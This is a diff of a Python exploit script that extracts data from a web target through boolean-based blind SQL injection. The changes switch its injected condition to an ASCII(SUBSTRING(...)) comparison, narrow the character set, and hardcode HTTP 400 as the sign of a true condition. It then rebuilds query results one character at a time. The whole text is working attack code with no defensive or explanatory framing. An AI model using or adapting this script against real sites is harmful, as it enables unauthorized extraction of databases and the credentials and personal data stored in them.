@@ -83,7 +83,7 @@ def check_vulnerability(target):
 def extract_data(target, query, true_marker, max_length=64, use_status=False):
     """Extract data using boolean-based blind SQL injection."""
     result = ""
-    charset = string.ascii_letters + string.digits + string.punctuation + " _-.@:"
+    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@_.-"
 
     print(f"[*] Extracting data with query: {query}")
     print(f"[*] Using marker: {true_marker} ({'status code' if use_status else 'response length'})")
@@ -93,11 +93,18 @@ def extract_data(target, query, true_marker, max_length=64, use_status=False):
         for char in charset:
             condition = (
                 f"SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+"
-                f"SUBSTRING(({query}),{pos},1)='{char}'"
+                f"ASCII(SUBSTRING(({query}),{pos},1))={ord(char)}"
             )
             length, status = test_sqli(target, condition)
 
-            matched = (status == true_marker) if use_status else (length == true_marker)
+            # If the character matches, the SQL condition is TRUE
+            # According to the vulnerability check:
+            # TRUE condition = HTTP 400
+            # FALSE condition = HTTP 200
+            if use_status:
+                matched = (status == 400)
+            else:
+                matched = (length == true_marker)
             if matched:
                 result += char
                 sys.stdout.write(f"\r[+] Extracted: {result}")
